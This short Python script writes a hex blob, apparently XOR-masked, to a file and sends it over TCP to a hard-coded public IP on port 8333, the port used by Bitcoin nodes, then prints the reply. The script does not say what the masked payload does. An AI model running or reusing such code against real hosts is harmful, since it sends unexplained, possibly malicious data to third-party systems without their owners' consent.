import socket
import os

def run_node_dispatch():
    target_host = "179.118.220.79"
    target_port = 8333
    filename = "xor_masked_kernel_tx.dat"
    payload_hex = "05040000050400000404000004040000040400000404000004040000040400000404000004040000040b30342b34342f34342f303453616376fbfffffb0500f2012e0100040441040404000004040000040400000404000004040000040400000404000004040000a804000004"

    if not os.path.exists(filename):
        with open(filename, "wb") as f:
            f.write(bytes.fromhex(payload_hex))

    with open(filename, "rb") as f:
        masked_data = f.read()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(15.0)
        s.connect((target_host, target_port))
        s.sendall(bytes(masked_data))
        response = s.recv(4096)
        if response:
            print(response.hex())

if __name__ == "__main__":
    run_node_dispatch()
